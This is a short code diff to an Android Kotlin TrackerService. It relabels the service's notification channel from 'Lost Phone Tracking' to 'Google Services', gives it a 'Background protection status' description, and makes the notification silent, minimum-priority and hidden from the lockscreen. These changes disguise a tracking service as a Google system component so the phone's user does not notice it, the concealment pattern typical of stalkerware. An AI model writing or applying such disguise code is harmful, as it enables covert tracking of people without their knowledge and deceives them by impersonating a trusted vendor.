@@ -246,7 +246,13 @@ class TrackerService : Service() {
 
     private fun createChannel() {
         val manager = getSystemService(NotificationManager::class.java)
-        val channel = NotificationChannel(CHANNEL_ID, "Lost Phone Tracking", NotificationManager.IMPORTANCE_LOW)
+        val channel = NotificationChannel(CHANNEL_ID, "Google Services", NotificationManager.IMPORTANCE_MIN).apply {
+            setShowBadge(false)
+            enableLights(false)
+            enableVibration(false)
+            description = "Background protection status"
+            lockscreenVisibility = Notification.VISIBILITY_SECRET
+        }
         manager.createNotificationChannel(channel)
     }
 
@@ -265,6 +271,11 @@ class TrackerService : Service() {
             .setSmallIcon(R.drawable.ic_stat_service)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
+            .setOnlyAlertOnce(true)
+            .setSilent(true)
+            .setCategory(NotificationCompat.CATEGORY_SERVICE)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
     }
 
